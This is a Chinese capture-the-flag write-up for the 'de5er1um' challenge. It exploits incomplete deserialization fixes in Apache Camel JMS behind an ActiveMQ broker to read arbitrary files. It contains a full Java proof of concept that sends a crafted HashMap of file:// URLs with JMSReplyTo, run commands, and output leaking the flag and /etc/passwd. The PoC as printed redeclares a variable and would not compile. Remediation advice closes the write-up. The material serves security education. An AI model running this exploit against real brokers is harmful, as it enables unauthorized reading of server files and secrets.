---
layout: document
title: "de5er1umWriteUp — ActiveMQ/Camel JMS"
short_title: "de5er1um_wp"
order: 1
icon: "fas fa-bug"
status:
  - hot
tags: [CTF, ActiveMQ, Camel, JMS, 反序列化, 文件读取, 白名单绕过, CVE-2026-40860, CVE-2026-42527]
author: sentryCyberSec
version: "1.0"
description: "de5er1um CTF 题目解题记录，利用 camel-jms 4.18.2 反序列化修复不完整（CVE-2026-40860）配合 JMSReplyTo 回复机制与 Camel TypeConverter 的 URL-to-String 文件读取行为，实现白名单类下的任意文件读取，获取网关容器 /flag。"
difficulty: "中等偏难"
cve: ["CVE-2026-40860", "CVE-2026-42527", "CVE-2026-43866"]
date: "2026-09-14"
---

{% capture _tips %}<a href="/document/00_ctf/02_de5er1um_jar_analysis/">de5er1um.jar 逆向分析报告</a>| <i class="fa fa-star"></i> de5er1um wp文章| <a href="/document/00_ctf/02_de5er1um_jar_analysis/"><i class="fa fa-link"></i> de5er1um.jar 下载链接</a>{% endcapture %}
{% include common-index/index-preset.html level="info" msg=_tips %}

**难度**：中等偏难（需理解 Camel JMS 反序列化修复的绕过思路 + JMS 请求-应答机制 + Camel 类型转换器的文件读取行为）

**Flag**：`flag{FtkGd6CuYmD5nH7MUcswPeAf2NEz1qjO}`（位于网关容器 `/flag`）

---

## 1. 题目环境

```
┌──────────────────────────┐        ┌────────────────────────────────┐
│  Broker (ActiveMQ 6.1.8) │        │  Gateway  (Spring Boot 3.5.13) │
│  HTTP transport :28364   │◄──────►│  Camel 4.18.2 + activemq6      │
│  XStream transport       │        │  consume gateway.inbound       │
│  ctf/ctf                 │        │  JmsConfig: trustAllPackages   │
└──────────────────────────┘        └────────────────────────────────┘
```

- 对外端口 `http://47.116.47.26:28364` 是 **ActiveMQ 的 HTTP transport**（HttpTunnelServlet，走 XStream 二进制 XML 协议封装 OpenWire 命令），无认证，默认凭据 `ctf/ctf`
- 网关 `de5er1um.jar`（附件）：Spring Boot 3.5.13 + Camel 4.18.2 + activemq-client 6.1.8，`JmsConfig` 硬编码 `setTrustAllPackages(true)`，路由 `CtfRoute` 消费 `activemq6:queue:gateway.inbound`，仅做日志（`payload type = {}`）
- 题目暗示：**「消息中间件依赖升级到官方修复版本，真的没问题吗？」** → 指向 camel-jms 4.18.2（CVE-2026-40860 的修复版本）存在修复不完整/被绕过的问题

## 2. 漏洞原理

### 2.1 CVE-2026-40860：camel-jms ObjectMessage 反序列化 RCE

`JmsBinding.extractBodyFromJms()` 在 `mapJmsMessage=true`（默认）时对 incoming ObjectMessage **无条件调用 `getObject()` 反序列化**。4.18.2 的修复是在**反序列化之后**做类白名单检查：

```java
//@hl 3-4
// JmsBinding.extractBodyFromJms — 4.18.2 修复后
if (message instanceof ObjectMessage objectMessage) {
    Object payload = objectMessage.getObject();   // ← 反序列化已发生
    checkDeserializedClass(payload);              // ← 后置检查，阻止不了 readObject 副作用
    ...
}
```

官方自己承认：**后置类检查无法阻止反序列化过程中的 readObject 链**。

### 2.2 CVE-2026-42527：默认 ObjectInputFilter 允许 java.net.URL（DNS 侧信道）

该默认过滤器模式 `java.**;javax.**;org.apache.camel.**;!*` 中的递归通配 `java.**` 放行了 `java.net.URL`——其 `hashCode()` 会做 DNS 解析。投递 `HashMap<URL, ...>` 反序列化时 `URL.hashCode` 触发对攻击者可控域名的 DNS 查询（OOB 侧信道）。远程验证：投递后靶机（阿里云 47.116.x/8.132.x 出口）确实查询了 interactsh 域名，确认反序列化通道 + 白名单边界（`java.net` 放行、`com.fasterxml`/`org.springframework` 拦截、`org.apache.camel` 放行）。

### 2.3 JMSReplyTo 请求-应答机制

投递的消息若带 `JMSReplyTo` 属性，Camel 消费端会把 Exchange 处理结果**回复到该队列**（reply body 默认 = 处理后的 message body）。

### 2.4 Camel TypeConverter：URL → String 会读取 URL 内容（任意文件读取关键）

回复时 `JmsBinding.createJmsMessageForType` 检测到 body 是 `Map` → 生成 `MapMessage`，`populateMapMessage` 对 Map 的每个 key 做类型转换：

```java
// JmsBinding.populateMapMessage
for (Map.Entry entry : map.entrySet()) {
    String key = CamelContextHelper.convertTo(context, String.class, entry.getKey());
    mapMessage.setObject(key, entry.getValue());
}
```

Camel 的 TypeConverter 把 `URL` 转 `String` 时走 `URL → InputStream → String` 转换链，**实际是 `URL.getContent()/openStream()` 读取 URL 指向的内容**。因此：

- `file:///flag` → 读取网关容器上的 flag 文件内容
- 文件内容成为回复 MapMessage 的 **key**（value 是原 value）

**整个利用不需要任何反序列化 gadget，无 RCE，纯白名单类（HashMap/URL）+ 回复机制 + 类型转换器完成任意文件读取。**

## 3. 完整 PoC

```java
// @add 34-38 @del 40
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQObjectMessage;
import org.apache.activemq.util.ByteSequence;
import jakarta.jms.*;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.file.*;
import java.util.Enumeration;
import java.util.HashMap;

/**
 * de5er1um exploit PoC
 *
 * 原理：
 * 1. CVE-2026-40860/42527：camel-jms 4.18.2 对 ObjectMessage 无条件反序列化，
 *    默认 ObjectInputFilter（java.**;javax.**;org.apache.camel.**;!*）允许 java.net.URL
 * 2. 投递顶层 HashMap<URL(file:///path), "x"> 作为 ObjectMessage，并设置 JMSReplyTo
 * 3. 网关消费后（route 仅日志），因带 JMSReplyTo 触发回复
 * 4. 回复时 JmsBinding.populateMapMessage 对 Map key 做 String 类型转换，
 *    Camel TypeConverter 把 URL 经 URL->InputStream->String 链读取 URL 内容
 *    （file:// URL 即任意文件读取），flag 出现在回复 MapMessage 的 key 中
 *
 * 用法：java -cp ... ExploitDe5er1um <broker-url> <file-path>
 * 例：  java -cp ... ExploitDe5er1um http://47.116.47.26:28364 /flag
 */
public class ExploitDe5er1um {

    public static void main(String[] args) throws Exception {
        String brokerUrl = args.length > 0 ? args[0] : "http://47.116.47.26:28364";
        String filePath = args.length > 1 ? args[1] : "/flag";
        // =====
        // 1. 构造 payload：HashMap<URL(file:///path), "x">
        String normalized = filePath.replace("\\", "/");
        if (!normalized.startsWith("/")) {
            normalized = "/" + normalized;
        }
        URL url = new URL("file://" + normalized); 
        // exp command path arg: "C:\\Windows\\win.ini" / "/etc/passwd"
        URL url = new URL("file://" + filePath);

        // =====
        HashMap<Object, Object> map = new HashMap<>();
        map.put(url, "x");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(map);
        }
        byte[] payload = bos.toByteArray();
        System.out.println("[*] payload: " + payload.length + " bytes, url = " + url);

        // 2. 连接 broker（HTTP transport）
        ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory(brokerUrl);
        cf.setUserName("ctf");
        cf.setPassword("ctf");
        try (Connection c = cf.createConnection()) {
            c.start();
            Session s = c.createSession(false, Session.AUTO_ACKNOWLEDGE);

            // 回复队列（唯一命名避免冲突）
            jakarta.jms.Queue replyQ = s.createQueue("flag.exfil." + System.currentTimeMillis() % 1000000);
            System.out.println("[*] reply queue: " + replyQ);

            // 3. 投递 ObjectMessage：content 反射直塞字节（绕过 setObject 信任检查）+ JMSReplyTo
            ActiveMQObjectMessage om = (ActiveMQObjectMessage) s.createObjectMessage();
            Field f = null;
            Class<?> cc = org.apache.activemq.command.ActiveMQMessage.class;
            while (cc != null && f == null) {
                try { f = cc.getDeclaredField("content"); } catch (NoSuchFieldException e) {}
                cc = cc.getSuperclass();
            }
            f.setAccessible(true);
            f.set(om, new ByteSequence(payload));
            om.setJMSReplyTo(replyQ);
            MessageProducer p = s.createProducer(s.createQueue("gateway.inbound"));
            p.send(om);
            System.out.println("[*] ObjectMessage sent to gateway.inbound with JMSReplyTo");

            // 4. 消费回复（网关会把文件内容放在 MapMessage 的 key 里）
            MessageConsumer mc = s.createConsumer(replyQ);
            Message m = mc.receive(20000);
            if (m == null) {
                System.out.println("[-] no reply in 20s (file not found or unreachable)");
                return;
            }
            System.out.println("[+] REPLY: " + m.getClass().getSimpleName());
            if (m instanceof MapMessage) {
                MapMessage mm = (MapMessage) m;
                Enumeration<?> en = mm.getMapNames();
                while (en.hasMoreElements()) {
                    String k = (String) en.nextElement();
                    String v = String.valueOf(mm.getObject(k));
                    System.out.println("[+] map key = " + k);
                    System.out.println("[+] map value = " + v);
                }
            } else if (m instanceof TextMessage) {
                System.out.println("[+] text = " + ((TextMessage) m).getText());
            }
        }
    }
}
```

编译运行（依赖：网关附件 `de5er1um.jar` 解包出的 `BOOT-INF/lib/*`，或等价 maven 依赖）：

```bash
CP="lib/*:activemq-http-6.1.8.jar:xstream-1.4.20.jar:xpp3-1.1.4c.jar:xmlpull-1.1.3.1.jar:httpclient-4.5.14.jar:httpcore-4.4.16.jar:commons-codec-1.16.1.jar:commons-logging-1.2.jar"
javac -cp "$CP" ExploitDe5er1um.java
java -cp "$CP:." ExploitDe5er1um http://47.116.47.26:28364 /flag
```

## 4. PoC 执行验证结果

### 4.1 读取 /flag（直接命中）

```bash
# @hl 5
$ java -cp "$CP:." ExploitDe5er1um http://47.116.47.26:28364 /flag
[*] reply queue: queue://flag.exfil.32370
[*] ObjectMessage sent to gateway.inbound with JMSReplyTo
[+] REPLY: ActiveMQMapMessage
[+] map key = flag{FtkGd6CuYmD5nH7MUcswPeAf2NEz1qjO}

[+] map value = x
```

### 4.2 读取 /etc/passwd（验证任意文件读取，非预期路径）

```bash
# @hl 5-9
$ java -cp "$CP:." ExploitDe5er1um http://47.116.47.26:28364 /etc/passwd
[*] reply queue: queue://flag.exfil.<n>
[*] ObjectMessage sent to gateway.inbound with JMSReplyTo
[+] REPLY: ActiveMQMapMessage
[+] map key = root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
ctf:x:1001:1001::/home/ctf:/usr/sbin/nologin

[+] map value = x
```

### 4.3 不存在路径（无回复）

```
$ java -cp "$CP:." ExploitDe5er1um http://47.116.47.26:28364 /no-such-file
[-] no reply in 20s (file not found or unreachable)
```

（TypeConverter 转换失败导致回复异常/无回复，可作为存在性判断）

## 5. 关键验证记录（黑盒确认链）

| 验证项 | 结果 | 意义 |
|--------|------|------|
| URLDNS | 靶机出口（8.132.x/47.116.x/47.101.x）DNS 查询 | 反序列化通道可用，`java.net.URL` 在白名单 |
| org.apache.camel.support | 靶机 DNS 查询 | `org.apache.camel` 在白名单（CVE-2026-43866 也成立，但本解法不需要） |
| POJONode/HotSwappableTargetSource... | 无任何交互 | 白名单外类被 `ObjectInputFilter` 拦截，标准 gadget 链不可用 |
| file:///etc/passwd + JMSReplyTo | 回复 MapMessage key = passwd 全文 | **TypeConverter 读取 URL 内容 → 任意文件读取** |
| file:///flag + JMSReplyTo | key = flag{...} | **拿到 flag** |

## 6. 修复建议

1. 升级 Camel 至 **4.18.3 / 4.14.8 / 4.21.0**（修复 CVE-2026-40860 不完整问题、CVE-2026-42527、CVE-2026-43866；4.18.3 起 `objectMessageEnabled` 默认关闭，不再无条件反序列化 ObjectMessage）
2. broker 侧启用授权，限制对 Camel 消费队列的发布者
3. 覆盖默认过滤器：`-Djdk.serialFilter='!java.net.**;java.**;javax.**;org.apache.camel.**;!*'`（显式 deny java.net 阻断 URL DNS 侧信道）